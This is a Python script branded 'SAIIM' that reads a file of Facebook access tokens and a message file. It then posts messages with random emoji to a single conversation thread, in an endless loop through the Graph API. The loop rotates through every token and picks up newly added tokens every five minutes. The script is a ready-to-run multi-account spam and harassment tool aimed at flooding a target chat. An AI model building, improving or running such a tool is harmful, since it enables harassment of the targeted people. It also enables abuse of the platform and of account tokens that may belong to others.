import os
import sys
import time
import json
import requests
import random
from datetime import datetime

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
RESET = '\033[0m'

CONFIG_FILE = "config.json"

BANNER = f"""{RED}
   _____ _____ _____ _____ 
  / ____|_   _|  __ \_   _|
 | (___   | | | |  | || |  
  \___ \  | | | |  | || |  
  ____) |_| |_| |__| || |_ 
 |_____/|_____|_____/_____|

       --- S A I I M ---{RESET}
"""

def print_banner():
    os.system("clear")
    print(BANNER)

def load_config():
    if not os.path.isfile(CONFIG_FILE):
        print(f"{RED}[x] config.json not found! Run convo.py first to generate it.{RESET}")
        sys.exit()
    with open(CONFIG_FILE, "r") as f:
        return json.load(f)

def get_profile_name(token):
    url = "https://graph.facebook.com/v15.0/me"
    try:
        r = requests.get(url, params={"access_token": token}, timeout=10)
        data = r.json()
        return data.get("name", "Unknown")
    except:
        return "Unknown"

def send_message(thread_id, message, token):
    url = f"https://graph.facebook.com/v15.0/t_{thread_id}"
    payload = {
        "access_token": token,
        "message": message
    }
    try:
        r = requests.post(url, data=payload, timeout=10)
        if r.ok:
            return True, None
        else:
            err = r.json().get("error", {}).get("message", "Unknown error")
            return False, err
    except Exception as e:
        return False, str(e)

def load_lines(path):
    if not os.path.exists(path):
        print(f"{RED}[x] File not found: {path}{RESET}")
        sys.exit()
    with open(path, "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip()]

def main():
    print_banner()
    config = load_config()

    token_file = config["token_file"]
    thread_id = config["thread_id"]
    prefix = config.get("prefix", "")
    message_file = config["message_file"]
    delay = int(config["delay"])

    emojis = [" 3:)", " :)", " :3", " ^_^", " :D", " ;)", " :P", " \u2764", " \u2639"]

    tokens = load_lines(token_file)
    messages = load_lines(message_file)
    sent_tokens = set(tokens)
    msg_index = 0

    print(f"{YELLOW}--- Live Logs (press Ctrl+C to stop) ---{RESET}")
    last_token_reload = time.time()

    while True:
        try:
            if time.time() - last_token_reload > 300:
                current_tokens = load_lines(token_file)
                for t in current_tokens:
                    if t not in sent_tokens:
                        print(f"{YELLOW}[+] New token added dynamically.{RESET}")
                        sent_tokens.add(t)
                tokens = list(sent_tokens)
                last_token_reload = time.time()

            for i, token in enumerate(tokens):
                msg = f"{prefix} {messages[msg_index % len(messages)]} {random.choice(emojis)}"
                print(f"{CYAN}THIS TOOL MADE BY SAIIM{RESET}")
                success, err = send_message(thread_id, msg, token)
                now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                if success:
                    name = get_profile_name(token)
                    print(f"{GREEN}[{now}] Message sent from '{name}': {msg}{RESET}")
                else:
                    print(f"{RED}[{now}] Failed (Token {i+1}): {err}{RESET}")
                    time.sleep(10)
                msg_index += 1
                time.sleep(delay)

        except Exception as e:
            print(f"{RED}[!] Unexpected error: {str(e)}{RESET}")
            time.sleep(30)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}Stopped by user.{RESET}")
        sys.exit()
